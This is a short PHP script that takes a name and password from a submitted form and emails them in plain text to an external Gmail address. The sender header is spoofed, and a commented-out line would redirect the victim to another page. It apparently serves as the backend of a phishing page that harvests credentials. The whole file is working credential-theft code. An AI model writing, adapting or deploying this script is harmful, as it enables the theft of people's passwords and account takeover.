<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = htmlspecialchars($_POST['name']);
    $password = htmlspecialchars($_POST['password']);

    $to = 'hallo.titty2@gmail.com'; // Your email address
    $subject = 'New Submission';
    $message = "Name: $name\nPassword: $password";
    $headers = "From: no-reply@yourdomain.com"; // Change to a valid email

    if (mail($to, $subject, $message, $headers)) {
        echo "Email sent successfully!";
        // Optionally, redirect to another page
        // header('Location: content.html');
    } else {
        echo "Email sending failed.";
    }
} else {
    echo "Invalid request.";
}
?>